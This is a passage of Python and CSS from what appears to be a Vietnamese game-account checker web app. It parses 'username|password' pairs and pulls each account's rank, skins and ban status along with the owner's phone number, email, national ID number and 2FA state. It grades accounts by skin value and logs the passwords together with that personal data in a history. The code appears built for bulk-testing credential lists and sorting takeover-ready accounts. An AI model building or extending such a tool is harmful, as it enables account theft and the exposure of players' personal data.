            rank_id = p_info.get("rank")
            r["rank_id"] = rank_id or 0
            if rank_id and rc.get(str(rank_id)):
                r["rank"] = rc[str(rank_id)].get("name", "")
            try:
                trend = rep.get("rank", {}).get("week", {}).get("trend", [])
                if trend: r["rank_stars"] = trend[-1].get("star", 0)
            except: pass
            try:
                pm_list = rep.get("match", {}).get("play_most", [])
                if pm_list:
                    pm = pm_list[0]; wr = pm.get("win_rate", {}).get("data", 0)
                    r["best_hero"] = f"{pm.get('hero_name','')} ({pm.get('play_count',0)} trận, WR: {wr}%)"
            except: pass
            try:
                bp = rep.get("match", {}).get("best_play", {})
                if bp:
                    kda = bp.get("kda", [0,0,0])
                    r["best_play"] = f"{bp.get('hero_name','')} KDA {kda[0]}/{kda[1]}/{kda[2]}"
            except: pass
            try:
                cnt = rep.get("match", {}).get("count", {})
                if cnt:
                    rk = cnt.get("rank", 0); nrk = cnt.get("non_rank", 0)
                    r["total_matches"] = f"{rk+nrk} trận (Rank: {rk}, Thường: {nrk})"
            except: pass
            if p_info.get("name"): r["name"] = p_info["name"]
            if p_info.get("player_uid"): r["player_uid"] = str(p_info["player_uid"])

        if kd:
            r["banned"] = kd.get('banned') == 'YES'
            if kd.get("ban_end_time"): r["ban_end_time"] = kd["ban_end_time"]
            if not r["rank"] or r["rank"] == "Chưa xếp hạng":
                rank_parsed, stars_parsed = parse_rank(kd.get('rank'))
                r["rank"] = rank_parsed
                if not r["rank_stars"]: r["rank_stars"] = kd.get('rank_stars', stars_parsed)
            if kd.get('level', 0) > 0: r["level"] = kd.get('level', 0)
            if kd.get('name') and not r["name"]: r["name"] = kd.get('name', '')
            if kd.get('player_uid') and not r["player_uid"]: r["player_uid"] = kd['player_uid']
            if not r["mobile_no"] and kd.get("mobile_no"): r["mobile_no"] = kd["mobile_no"]
            if not r["email"] and kd.get("email"): r["email"] = kd["email"]
            if not r["idcard"] and kd.get("idcard"): r["idcard"] = kd["idcard"]
            if not r["two_fa"] and kd.get("two_fa"): r["two_fa"] = kd["two_fa"]

        if not r["rank"] or r["rank"] == "Chưa xếp hạng":
            rank_raw = usr.get('rankName') or usr.get('rank') or usr.get('rankId') or usr.get('tier') or usr.get('tierName') or ''
            star_raw = usr.get('star') or usr.get('stars') or usr.get('rankStar') or usr.get('starCount') or 0
            if rank_raw:
                rank_parsed, stars_parsed = parse_rank(rank_raw)
                if rank_parsed and rank_parsed != "Chưa xếp hạng":
                    r["rank"] = rank_parsed
                    if not r["rank_stars"]: r["rank_stars"] = int(star_raw) if str(star_raw).isdigit() else stars_parsed

        all_skins = []; other_skins = []; sss_list, ss_list, anime_list = [], [], []
        if sd:
            up = ((sd.get("data") or {}).get("getUser") or {}).get("profile") or {}
            oids = up.get("ownedItemIdList") or []
            for iid in oids:
                info = parse_item_info(iid)
                if info:
                    info["cdn"] = _hero_cdn(iid)
                    all_skins.append(info)
                    if info['tier'] == 'SSS': sss_list.append(info)
                    elif info['tier'] == 'SS': ss_list.append(info)
                    elif info['tier'] == 'Anime': anime_list.append(info)
                else:
                    hero_name = get_hero_name_from_id(iid)
                    other_skins.append({"item_id": iid, "hero_name": hero_name,
                                        "skin_name": f"Skin #{iid}", "tier": "Normal",
                                        "cdn": _hero_cdn(iid)})
        r["sss"] = sss_list; r["ss"] = ss_list; r["anime"] = anime_list
        r["other_skins"] = other_skins
        r["all_skins"] = all_skins + other_skins
        r["total_skins"] = len(r["all_skins"])
        r["skins"] = all_skins
        if r["banned"]: r["type"] = "banned"
        elif r["sss"]: r["type"] = "sss"
        elif r["anime"]: r["type"] = "anime"
        elif r["ss"]: r["type"] = "ss"
        elif r["total_skins"] <= 5: r["type"] = "trang"
        else: r["type"] = "normal"
    except Exception as e:
        r["error"] = str(e); r["type"] = "failed"
    return r

def format_result(r, short=False):
    lines = []
    t = r.get("type", "unknown")
    icons = {"sss": "◈", "ss": "◆", "anime": "◇", "normal": "▪", "trang": "○", "banned": "✖", "failed": "✕"}
    lines.append(f"{icons.get(t, '?')} [{t.upper()}] {r.get('username','')}|{r.get('password','')}")
    if t == "failed":
        lines.append(f"   └─ {r.get('error','')}"); return "\n".join(lines)
    lines.append(f"   ├─ UID: {r.get('uid','N/A')}")
    if r.get('player_uid'): lines.append(f"   ├─ Player UID: {r['player_uid']}")
    lines.append(f"   ├─ Tên ĐN: {r.get('username_display','') or r.get('username','')}")
    lines.append(f"   ├─ Nick: {r.get('name','') or r.get('nickname','') or 'Chưa đặt'}")
    lines.append(f"   ├─ Rank: {r.get('rank','') or 'Chưa xếp hạng'} ({r.get('rank_stars',0)}★)")
    lines.append(f"   ├─ Level: {r.get('level',0)}")
    lines.append(f"   ├─ Sò: {r.get('shell',0)}")
    phone = r.get('mobile_no', ''); email = r.get('email', '')
    cc = r.get('country_code', '')
    phone_disp = f"{phone} (+{cc})" if (phone and cc) else (phone if phone else 'Không có')
    lines.append(f"   ├─ SĐT: {phone_disp}")
    lines.append(f"   ├─ Email: {email if email else 'Không có'}")
    lines.append(f"   ├─ CCCD: {r.get('idcard','') or 'Chưa liên kết'}")
    lines.append(f"   ├─ 2FA: {'BẬT' if r.get('two_fa') else 'TẮT'}")
    ban_txt = 'BAN' if r.get('banned') else 'CLEAN'
    if r.get('banned') and r.get('ban_end_time'):
        ban_txt = f"BAN đến {r['ban_end_time']}"
    lines.append(f"   ├─ BAN: {ban_txt}")
    if r.get('best_hero'): lines.append(f"   ├─ Tướng tủ: {r['best_hero']}")
    if r.get('best_play'): lines.append(f"   ├─ Trận ấn tượng: {r['best_play']}")
    if r.get('total_matches'): lines.append(f"   ├─ Tổng trận: {r['total_matches']}")
    lines.append(f"   ├─ Tổng Skin: {r.get('total_skins', 0)}")
    sss_list = r.get("sss", []); ss_list = r.get("ss", []); anime_list = r.get("anime", [])
    if not (sss_list or ss_list or anime_list):
        lines.append(f"   └─ (Không có skin SSS / SS / Anime)"); return "\n".join(lines)
    groups = []
    if sss_list: groups.append(("sss", sss_list))
    if ss_list: groups.append(("ss", ss_list))
    if anime_list: groups.append(("anime", anime_list))
    for g_idx, (tier_key, tier_list) in enumerate(groups):
        is_last_group = (g_idx == len(groups) - 1)
        if tier_key == "sss": header = f"   {'└─' if is_last_group else '├─'} ⭐ SSS ({len(tier_list)}):"; icon = "⭐"
        elif tier_key == "ss": header = f"   {'└─' if is_last_group else '├─'} ◆ SS ({len(tier_list)}):"; icon = "◆"
        else: header = f"   {'└─' if is_last_group else '├─'} ◇ Anime ({len(tier_list)}):"; icon = "◇"
        lines.append(header)
        for s_idx, skin in enumerate(tier_list):
            is_last_skin = (s_idx == len(tier_list) - 1)
            branch = "└─" if (is_last_group and is_last_skin) else "├─"
            indent = "   " + ("   " if is_last_group else "│  ")
            lines.append(f"{indent}{branch} {icon} [{skin.get('item_id','')}] {skin.get('hero_name','?')} → {skin.get('skin_name','?')}")
    return "\n".join(lines)

def make_hist_entry(r, acc):
    return {"id": uuid.uuid4().hex[:12], "acc": acc, "password": r.get("password", ""),
        "result": r.get("type", "unknown"), "time": datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
        "uid": r.get("uid", ""), "nick": r.get("name", ""), "rank": r.get("rank", ""),
        "rank_stars": r.get("rank_stars", 0), "level": r.get("level", 0), "shell": r.get("shell", 0),
        "banned": r.get("banned", False), "ban_end_time": r.get("ban_end_time", ""),
        "error": r.get("error", ""), "total_skins": r.get("total_skins", 0),
        "mobile_no": r.get("mobile_no", ""), "country_code": r.get("country_code", ""),
        "email": r.get("email", ""), "idcard": r.get("idcard", ""), "two_fa": r.get("two_fa", False),
        "username_display": r.get("username_display", ""), "nickname": r.get("nickname", ""),
        "player_uid": r.get("player_uid", ""),
        "best_hero": r.get("best_hero", ""), "best_play": r.get("best_play", ""),
        "total_matches": r.get("total_matches", ""), "rank_id": r.get("rank_id", 0),
        "skins_sss": [{"hero": s["hero_name"], "skin": s["skin_name"], "id": s["item_id"], "cdn": s.get("cdn","")} for s in r.get("sss", [])],
        "skins_ss": [{"hero": s["hero_name"], "skin": s["skin_name"], "id": s["item_id"], "cdn": s.get("cdn","")} for s in r.get("ss", [])],
        "skins_anime": [{"hero": s["hero_name"], "skin": s["skin_name"], "id": s["item_id"], "cdn": s.get("cdn","")} for s in r.get("anime", [])],
        "skins_other": [{"hero": s["hero_name"], "skin": s["skin_name"], "id": s["item_id"], "cdn": s.get("cdn","")} for s in r.get("other_skins", [])]}

def render_mon_phai_svg(mid, size=80):
    mp = MON_PHAI.get(mid, {})
    color = mp.get("color", "#a855f7")
    return f'<div style="width:{size}px; height:{size}px; display:inline-flex; align-items:center; justify-content:center; border-radius:50%; background:radial-gradient(circle, {color}40, transparent 70%); border:2px solid {color}; font-size:{size*0.5}px; box-shadow:0 0 25px {color}80;">{mp.get("emoji","⛩")}</div>'

def render_vu_khi_svg(wid, size=60):
    w = VU_KHI.get(wid, {})
    color = w.get("color", "#a855f7")
    return f'<div style="width:{size}px; height:{size}px; display:inline-flex; align-items:center; justify-content:center; border-radius:50%; background:radial-gradient(circle, {color}40, transparent 70%); border:2px solid {color}; font-size:{size*0.5}px; box-shadow:0 0 20px {color}80;">{w.get("emoji","⚡")}</div>'

def render_canh_gioi_badge(level_idx, size=70):
    if level_idx >= len(CULTIVATION_LEVELS): level_idx = len(CULTIVATION_LEVELS) - 1
    lv = CULTIVATION_LEVELS[level_idx]
    color = lv["color"]; icon = lv["icon"]
    return f'<div style="display:inline-flex; align-items:center; justify-content:center; width:{size}px; height:{size}px; border-radius:50%; background: radial-gradient(circle, {color}40, transparent 70%); border:2px solid {color}; box-shadow: 0 0 25px {color}80, inset 0 0 15px {color}40; font-size:{size*0.4}px;"><span style="filter:drop-shadow(0 0 8px {color});">{icon}</span></div>'

BASE_CSS = """
<style>
@import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;500;700;900&family=Rajdhani:wght@400;500;600;700&family=Share+Tech+Mono&display=swap');
* { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
:root { --pink: #ff00e5; --cyan: #00f0ff; --purple: #a855f7; --green: #00ff88; --orange: #ffb800; --red: #ff2951; --gray: #8b8b9a; --bg: #05000e; --glass: rgba(255,255,255,0.04); --border: rgba(255,255,255,0.08); --text: #ffffff; --text-dim: #a0a0b8; --text-mute: #5a5a70; }
html, body { font-family: 'Rajdhani', sans-serif; background: var(--bg); color: var(--text); min-height: 100vh; overflow-x: hidden; position: relative; }
body::before { content: ''; position: fixed; inset: 0; background: radial-gradient(circle at 0% 0%, rgba(255,0,229,0.25), transparent 40%), radial-gradient(circle at 100% 100%, rgba(0,240,255,0.25), transparent 40%), radial-gradient(circle at 50% 50%, rgba(168,85,247,0.15), transparent 60%); z-index: -2; animation: bgPulse 15s ease-in-out infinite; }
@keyframes bgPulse { 0%, 100% { opacity: 0.8; transform: scale(1); } 50% { opacity: 1; transform: scale(1.05); } }
body::after { content: ''; position: fixed; inset: 0; background-image: linear-gradient(rgba(0,240,255,0.04) 1px, transparent 1px), linear-gradient(90deg, rgba(0,240,255,0.04) 1px, transparent 1px); background-size: 40px 40px; z-index: -1; pointer-events: none; animation: gridMove 30s linear infinite; }
@keyframes gridMove { 0% { transform: translate(0,0); } 100% { transform: translate(40px,40px); } }
.container { max-width: 720px; margin: 0 auto; padding: 14px; position: relative; z-index: 1; padding-bottom: 40px; }
.app-header { display: flex; align-items: center; justify-content: space-between; padding: 12px 16px; background: linear-gradient(135deg, rgba(20,0,43,0.85), rgba(30,0,60,0.85)); backdrop-filter: blur(24px); border: 1px solid rgba(255,0,229,0.25); border-radius: 20px; margin-bottom: 14px; position: sticky; top: 10px; z-index: 100; box-shadow: 0 8px 40px rgba(255,0,229,0.15); }
.app-logo { display: flex; align-items: center; gap: 10px; }
.app-logo-icon { width: 42px; height: 42px; border-radius: 13px; background: linear-gradient(135deg, #ff00e5, #a855f7, #00f0ff); background-size: 300% 300%; display: flex; align-items: center; justify-content: center; font-size: 1.3em; box-shadow: 0 0 20px rgba(255,0,229,0.6); animation: logoShift 6s ease infinite; }
@keyframes logoShift { 0%, 100% { background-position: 0% 50%; } 50% { background-position: 100% 50%; } }
.app-logo-text { font-family: 'Orbitron', sans-serif; font-size: 1.1em; font-weight: 900; letter-spacing: 2.5px; background: linear-gradient(90deg, #ff00e5, #00f0ff, #a855f7); background-size: 200% 100%; -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text; animation: logoShift 4s ease infinite; }
.balance-pill { display: flex; align-items: center; gap: 6px; padding: 8px 14px; background: linear-gradient(135deg, rgba(255,0,229,0.2), rgba(168,85,247,0.2)); border: 1px solid rgba(255,0,229,0.5); border-radius: 30px; font-weight: 800; font-size: 0.9em; color: #ff88ee; font-family: 'Orbitron', sans-serif; }
.icon-btn { width: 38px; height: 38px; display: flex; align-items: center; justify-content: center; background: var(--glass); border: 1px solid var(--border); border-radius: 12px; color: var(--text-dim); text-decoration: none; font-size: 1.1em; transition: all 0.3s; }
.icon-btn:hover { color: var(--orange); border-color: var(--orange); box-shadow: 0 0 20px rgba(255,184,0,0.4); transform: translateY(-2px); }
.icon-btn.logout { width: auto; padding: 0 14px; gap: 6px; }
.icon-btn.logout:hover { color: var(--red); border-color: var(--red); box-shadow: 0 0 20px rgba(255,41,81,0.4); }
.icon-btn.logout span:last-child { font-family: 'Orbitron', sans-serif; font-size: 0.7em; font-weight: 700; letter-spacing: 1px; }
.card { background: linear-gradient(135deg, rgba(20,0,43,0.7), rgba(15,0,30,0.7)); backdrop-filter: blur(24px); border: 1px solid var(--border); border-radius: 20px; padding: 20px; margin-bottom: 14px; position: relative; overflow: hidden; box-shadow: 0 8px 32px rgba(0,0,0,0.4); }
.card::before { content: ''; position: absolute; top: 0; left: 0; right: 0; height: 2px; background: linear-gradient(90deg, transparent, var(--pink), var(--cyan), transparent); background-size: 200% 100%; opacity: 0.8; animation: logoShift 4s ease infinite; }
.card-title { font-family: 'Orbitron', sans-serif; font-size: 1.1em; font-weight: 800; letter-spacing: 2px; margin-bottom: 16px; display: flex; align-items: center; gap: 10px; color: #fff; text-transform: uppercase; }
.card-title-icon { font-size: 1em; }
.menu-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; }
.menu-btn { text-decoration: none; background: linear-gradient(135deg, rgba(255,255,255,0.03), rgba(255,0,229,0.02)); border: 1px solid var(--border); border-radius: 16px; padding: 16px 8px; text-align: center; color: var(--text); display: flex; flex-direction: column; align-items: center; position: relative; overflow: hidden; transition: all 0.4s cubic-bezier(0.34, 1.56, 0.64, 1); }
.menu-btn:hover, .menu-btn.active { transform: translateY(-4px); border-color: var(--pink); box-shadow: 0 12px 40px rgba(255,0,229,0.4); }
.menu-icon { font-size: 1.9em; margin-bottom: 6px; filter: drop-shadow(0 0 12px rgba(255,0,229,0.7)); }
.menu-label { font-family: 'Orbitron', sans-serif; font-size: 0.6em; font-weight: 700; letter-spacing: 1.2px; text-transform: uppercase; color: var(--text-dim); }
.menu-btn.active .menu-label { color: #ff88ee; }
.menu-badge { position: absolute; top: 8px; right: 8px; background: linear-gradient(135deg, #ff00e5, #ff0066); color: #fff; font-size: 0.6em; padding: 3px 7px; border-radius: 10px; font-weight: 800; min-width: 18px; }
.form-group { margin-bottom: 16px; }
.form-label { display: block; font-size: 0.75em; color: var(--text-dim); margin-bottom: 8px; font-weight: 700; letter-spacing: 1.5px; text-transform: uppercase; font-family: 'Orbitron', sans-serif; }
.form-input, .form-textarea { width: 100%; padding: 14px 16px; background: rgba(0,0,0,0.5); border: 1.5px solid var(--border); border-radius: 12px; color: var(--text); font-size: 0.95em; font-family: inherit; transition: all 0.3s; outline: none; }
.form-input:focus, .form-textarea:focus { border-color: var(--pink); background: rgba(0,0,0,0.7); box-shadow: 0 0 0 3px rgba(255,0,229,0.15); }
.form-input::placeholder, .form-textarea::placeholder { color: var(--text-mute); }
.form-textarea { min-height: 100px; resize: vertical; font-family: 'Share Tech Mono', monospace; }
.btn { display: inline-flex; align-items: center; justify-content: center; gap: 8px; padding: 14px 24px; background: linear-gradient(135deg, #ff00e5, #a855f7); background-size: 200% 200%; color: #fff; border: none; border-radius: 12px; font-weight: 800; font-size: 0.9em; cursor: pointer; text-decoration: none; font-family: 'Orbitron', sans-serif; letter-spacing: 1.5px; text-transform: uppercase; transition: all 0.3s; box-shadow: 0 6px 25px rgba(255,0,229,0.5); }
.btn:hover { transform: translateY(-3px); box-shadow: 0 12px 40px rgba(255,0,229,0.7); }
.btn-block { display: flex; width: 100%; }
.btn-secondary { background: linear-gradient(135deg, rgba(255,255,255,0.08), rgba(255,255,255,0.04)); border: 1.5px solid var(--border); color: var(--text); box-shadow: none; }
.btn-secondary:hover { border-color: var(--pink); background: rgba(255,0,229,0.1); }
.btn-success { background: linear-gradient(135deg, #00ff88, #00d4aa); box-shadow: 0 6px 25px rgba(0,255,136,0.5); color: #000; }
.btn-warning { background: linear-gradient(135deg, #ffb800, #ff8800); color: #000; box-shadow: 0 6px 25px rgba(255,184,0,0.5); }
.btn-danger { background: linear-gradient(135deg, #ff2951, #d50000); box-shadow: 0 6px 25px rgba(255,41,81,0.5); }
.btn-info { background: linear-gradient(135deg, #00f0ff, #00a5ff); color: #000; box-shadow: 0 6px 25px rgba(0,240,255,0.5); }
.btn-sm { padding: 8px 16px; font-size: 0.72em; width: auto; }
.stat-grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 12px; }
.stat-grid-3 { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; }
.stat-grid-4 { display: grid; grid-template-columns: repeat(4, 1fr); gap: 8px; }
.stat-grid-5 { display: grid; grid-template-columns: repeat(5, 1fr); gap: 6px; }
.stat-box { background: linear-gradient(135deg, rgba(0,0,0,0.4), rgba(20,0,43,0.4)); border: 1px solid var(--border); border-radius: 16px; padding: 16px; text-align: center; transition: all 0.3s; }
.stat-box:hover { border-color: rgba(255,0,229,0.5); transform: translateY(-3px); }
.stat-value { font-family: 'Orbitron', sans-serif; font-size: 1.9em; font-weight: 900; background: linear-gradient(135deg, #ff00e5, #00f0ff); -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text; line-height: 1.1; margin-bottom: 6px; }
.stat-label { font-size: 0.65em; color: var(--text-dim); text-transform: uppercase; letter-spacing: 1.5px; font-weight: 700; font-family: 'Orbitron', sans-serif; }
.stat-box.small { padding: 10px 6px; }
.stat-box.small .stat-value { font-size: 1.4em; margin-bottom: 2px; }
.stat-box.small .stat-label { font-size: 0.52em; letter-spacing: 1px; }
.flash { padding: 14px 16px; border-radius: 12px; margin-bottom: 12px; font-weight: 600; font-size: 0.9em; display: flex; align-items: center; gap: 10px; }
.flash.error { background: rgba(255,0,60,0.15); border: 1px solid rgba(255,0,60,0.5); color: #ff88aa; }
.flash.success { background: rgba(0,255,136,0.15); border: 1px solid rgba(0,255,136,0.5); color: #88ffcc; }
.result-box { background: rgba(0,0,0,0.6); border: 1px solid var(--border); border-radius: 14px; padding: 16px; font-family: 'Share Tech Mono', monospace; font-size: 0.78em; line-height: 1.7; color: #c0c0e0; white-space: pre-wrap; word-break: break-word; max-height: 500px; overflow-y: auto; }
.info-row { display: flex; justify-content: space-between; padding: 12px 0; border-bottom: 1px solid var(--border); font-size: 0.9em; }
.info-row:last-child { border-bottom: none; }
.info-label { color: var(--text-dim); font-weight: 600; font-size: 0.9em; }
.info-value { color: var(--text); font-weight: 700; text-align: right; word-break: break-all; }
.list-item { background: linear-gradient(135deg, rgba(0,0,0,0.3), rgba(20,0,43,0.3)); border: 1px solid var(--border); border-radius: 14px; padding: 14px 16px; margin-bottom: 10px; display: flex; align-items: center; justify-content: space-between; gap: 12px; text-decoration: none; color: var(--text); transition: all 0.3s; }
.list-item:hover { border-color: rgba(255,0,229,0.5); transform: translateX(5px); }
.tab-bar { display: flex; gap: 8px; overflow-x: auto; margin-bottom: 16px; padding-bottom: 4px; scrollbar-width: none; }
.tab-bar::-webkit-scrollbar { display: none; }
.tab-item { flex-shrink: 0; padding: 10px 14px; background: rgba(255,255,255,0.03); border: 1px solid var(--border); border-radius: 14px; color: var(--text-dim); text-decoration: none; font-weight: 700; font-size: 0.75em; white-space: nowrap; transition: all 0.3s; font-family: 'Orbitron', sans-serif; letter-spacing: 1px; }
.tab-item.active { background: linear-gradient(135deg, rgba(255,0,229,0.2), rgba(168,85,247,0.2)); border-color: var(--pink); color: #ff88ee; }
.tab-item.sss-tab.active { background: linear-gradient(135deg, rgba(255,184,0,0.25), rgba(255,215,0,0.15)); border-color: #ffb800; color: #ffd700; }
.tab-item.ss-tab.active { background: linear-gradient(135deg, rgba(0,240,255,0.25), rgba(0,229,255,0.15)); border-color: #00f0ff; color: #00f0ff; }
.tab-item.anime-tab.active { background: linear-gradient(135deg, rgba(224,64,251,0.25), rgba(186,85,211,0.15)); border-color: #e040fb; color: #e040fb; }
.tab-item.trang-tab.active { background: linear-gradient(135deg, rgba(139,139,154,0.25), rgba(90,90,112,0.15)); border-color: #8b8b9a; color: #a0a0b8; }
.skin-tag { display: inline-block; padding: 6px 14px; margin: 4px; border-radius: 10px; font-size: 0.75em; font-weight: 600; font-family: 'Share Tech Mono', monospace; }
.skin-sss { background: linear-gradient(135deg, rgba(255,184,0,0.2), rgba(255,215,0,0.1)); color: #ffd700; border: 1px solid rgba(255,184,0,0.5); }
.skin-ss { background: linear-gradient(135deg, rgba(0,240,255,0.2), rgba(0,229,255,0.1)); color: #00f0ff; border: 1px solid rgba(0,240,255,0.5); }
.skin-anime { background: linear-gradient(135deg, rgba(224,64,251,0.2), rgba(186,85,211,0.1)); color: #e040fb; border: 1px solid rgba(224,64,251,0.5); }
.skin-normal { background: linear-gradient(135deg, rgba(139,139,154,0.2), rgba(90,90,112,0.1)); color: #a0a0b8; border: 1px solid rgba(139,139,154,0.4); }
.cred-box { background: linear-gradient(135deg, rgba(0,240,255,0.08), rgba(255,0,229,0.08)); border: 1.5px solid rgba(0,240,255,0.4); border-radius: 14px; padding: 16px; margin-bottom: 14px; }
.cred-label { font-family: 'Orbitron', sans-serif; font-size: 0.68em; color: var(--text-dim); text-transform: uppercase; letter-spacing: 1.5px; font-weight: 700; margin-bottom: 6px; }
.cred-value { font-family: 'Share Tech Mono', monospace; font-size: 1em; color: #00f0ff; font-weight: 700; word-break: break-all; padding: 8px 12px; background: rgba(0,0,0,0.5); border-radius: 8px; margin-bottom: 12px; border: 1px solid rgba(0,240,255,0.2); cursor: pointer; user-select: all; }
.cred-value:hover { background: rgba(0,240,255,0.1); border-color: #00f0ff; }
.cred-value:last-child { margin-bottom: 0; }
.spinner { display: inline-block; width: 22px; height: 22px; border: 3px solid rgba(255,0,229,0.2); border-top-color: var(--pink); border-radius: 50%; animation: spin 0.8s linear infinite; vertical-align: middle; margin-right: 8px; }
@keyframes spin { to { transform: rotate(360deg); } }
.progress-container { background: rgba(0,0,0,0.4); border: 1px solid var(--border); border-radius: 16px; padding: 20px; margin: 16px 0; }
.progress-bar-wrap { width: 100%; height: 24px; background: rgba(0,0,0,0.6); border-radius: 12px; overflow: hidden; position: relative; margin: 12px 0; border: 1px solid var(--border); }
.progress-bar-fill { height: 100%; background: linear-gradient(90deg, #ff00e5, #a855f7, #00f0ff, #ff00e5); background-size: 300% 100%; animation: logoShift 2s linear infinite; border-radius: 12px; transition: width 0.5s; }
.progress-text { position: absolute; top: 50%; left: 50%; transform: translate(-50%,-50%); font-family: 'Orbitron', sans-serif; font-weight: 800; font-size: 0.78em; color: #fff; text-shadow: 0 0 10px rgba(0,0,0,0.9); }
.live-stats { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; margin-top: 14px; }
.live-stat { background: rgba(0,0,0,0.4); border: 1px solid var(--border); border-radius: 12px; padding: 10px 8px; text-align: center; }
.live-stat .num { font-family: 'Orbitron', sans-serif; font-size: 1.4em; font-weight: 900; line-height: 1; }
.live-stat .lbl { font-size: 0.6em; color: var(--text-dim); text-transform: uppercase; letter-spacing: 1px; font-weight: 700; margin-top: 4px; }
.live-log { background: rgba(0,0,0,0.7); border: 1px solid var(--border); border-radius: 12px; padding: 12px; font-family: 'Share Tech Mono', monospace; font-size: 0.72em; line-height: 1.6; max-height: 400px; overflow-y: auto; margin-top: 14px; }
.live-log .log-line.sss { color: #ffd700 !important; font-weight: 700; }
.live-log .log-line.ss { color: #00f0ff !important; font-weight: 600; }
.live-log .log-line.anime { color: #e040fb !important; font-weight: 600; }
.live-log .log-line.banned { color: #ff2951 !important; }
.live-log .log-line.failed { color: #8b8b9a !important; }
.live-log .log-line.trang { color: #a0a0b8 !important; }
.live-log .log-line.normal { color: #c0c0e0; }
.live-log .log-sub { color: #8b8b9a; padding-left: 20px; }
::-webkit-scrollbar { width: 6px; height: 6px; }
::-webkit-scrollbar-thumb { background: linear-gradient(135deg, #ff00e5, #a855f7); border-radius: 3px; }
.mp-grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 14px; }
.mp-card { background: linear-gradient(135deg, rgba(20,0,43,0.7), rgba(15,0,30,0.7)); border: 2px solid var(--border); border-radius: 20px; padding: 20px 14px; text-align: center; cursor: pointer; transition: all 0.4s cubic-bezier(0.34,1.56,0.64,1); position: relative; overflow: hidden; }
.mp-card:hover { transform: translateY(-6px) scale(1.02); border-color: currentColor; box-shadow: 0 0 30px currentColor; }
.mp-name { font-family: 'Orbitron', sans-serif; font-weight: 900; letter-spacing: 1.5px; font-size: 1em; margin-top: 10px; }
.mp-desc { font-size: 0.72em; color: var(--text-dim); margin-top: 6px; line-height: 1.4; }
.mp-stats { display: flex; gap: 6px; justify-content: center; margin-top: 10px; flex-wrap: wrap; }
.mp-stat { font-size: 0.65em; padding: 3px 8px; border-radius: 8px; font-weight: 700; background: rgba(0,0,0,0.5); border: 1px solid currentColor; }
.vk-grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 12px; }
.vk-card { background: linear-gradient(135deg, rgba(20,0,43,0.7), rgba(15,0,30,0.7)); border: 2px solid var(--border); border-radius: 18px; padding: 14px; text-align: center; transition: all 0.3s; cursor: pointer; position: relative; }
.vk-card:hover { transform: translateY(-4px); border-color: currentColor; box-shadow: 0 0 25px currentColor; }
.vk-card.owned { border-color: #00ff88; box-shadow: 0 0 25px rgba(0,255,136,0.4); }
.vk-card.owned::after { content: '✓ ĐÃ CÓ'; position: absolute; top: 8px; right: 8px; font-size: 0.6em; background: #00ff88; color: #000; padding: 3px 8px; border-radius: 8px; font-weight: 900; }
.vk-name { font-family: 'Orbitron', sans-serif; font-weight: 800; letter-spacing: 1px; font-size: 0.85em; margin-top: 8px; }
.vk-atk { font-size: 0.75em; color: #ffd700; margin-top: 4px; font-weight: 700; }
.vk-cost { font-size: 0.72em; color: #ff88ee; margin-top: 6px; font-weight: 700; }
.cg-list { display: flex; flex-direction: column; gap: 8px; max-height: 500px; overflow-y: auto; padding-right: 6px; }
.cg-item { display: flex; align-items: center; gap: 14px; padding: 12px 14px; background: rgba(0,0,0,0.4); border-radius: 14px; border-left: 4px solid currentColor; transition: all 0.3s; }
.cg-item:hover { transform: translateX(6px); }
.cg-item.current { border-width: 4px; box-shadow: 0 0 25px currentColor; }
.cg-icon { font-size: 2em; filter: drop-shadow(0 0 12px currentColor); }
.cg-info { flex: 1; }
.cg-name { font-family: 'Orbitron', sans-serif; font-weight: 800; letter-spacing: 1.2px; font-size: 0.95em; }
.cg-stats { font-size: 0.7em; color: var(--text-dim); margin-top: 3px; }
.cg-req { font-size: 0.68em; color: #ffb800; font-weight: 700; margin-top: 3px; }
.cg-req.locked { color: #ff2951; }
.file-preview { background: rgba(0,0,0,0.6); border: 1px solid var(--border); border-radius: 14px; padding: 14px; font-family: 'Share Tech Mono', monospace; font-size: 0.78em; color: #c0c0e0; max-height: 220px; overflow-y: auto; line-height: 1.6; white-space: pre; }
.file-preview .ok { color: #00ff88; }
.file-preview .bad { color: #ff2951; }
.sep-picker { display: flex; gap: 8px; flex-wrap: wrap; margin-top: 10px; }
.sep-btn { padding: 8px 14px; background: rgba(255,255,255,0.05); border: 1.5px solid var(--border); border-radius: 10px; color: var(--text-dim); font-family: 'Share Tech Mono', monospace; font-size: 0.85em; cursor: pointer; transition: all 0.2s; font-weight: 700; }
.sep-btn:hover { border-color: var(--pink); color: var(--pink); }
.sep-btn.active { background: linear-gradient(135deg, rgba(255,0,229,0.2), rgba(168,85,247,0.2)); border-color: var(--pink); color: #ff88ee; }
.filter-badge { display: inline-block; padding: 3px 10px; background: rgba(0,255,136,0.15); color: #00ff88; border: 1px solid rgba(0,255,136,0.4); border-radius: 8px; font-size: 0.7em; font-weight: 700; font-family: 'Orbitron', sans-serif; }
@media (max-width: 480px) {
    .container { padding: 12px; }
    .card { padding: 16px; border-radius: 16px; }
    .card-title { font-size: 1em; }
    .stat-value { font-size: 1.6em; }
    .menu-grid { gap: 8px; }
    .menu-btn { padding: 12px 6px; }
    .menu-icon { font-size: 1.6em; }
    .mp-grid, .vk-grid { grid-template-columns: 1fr; }
}
</style>
<script>
function showToast(msg) {
    var t = document.createElement('div');
    t.style.cssText = 'position:fixed; bottom:30px; left:50%; transform:translateX(-50%) translateY(100px); background:linear-gradient(135deg,#ff00e5,#a855f7); color:#fff; padding:14px 24px; border-radius:14px; font-weight:700; z-index:9999; box-shadow:0 10px 40px rgba(255,0,229,0.6); transition:transform 0.4s cubic-bezier(0.34,1.56,0.64,1); font-family:Orbitron; letter-spacing:1px;';
    t.textContent = msg; document.body.appendChild(t);
    setTimeout(function() { t.style.transform = 'translateX(-50%) translateY(0)'; }, 50);
    setTimeout(function() { t.style.transform = 'translateX(-50%) translateY(100px)'; setTimeout(function(){t.remove();}, 400); }, 2500);
}
function copyText(el) {
    if (navigator.clipboard) {
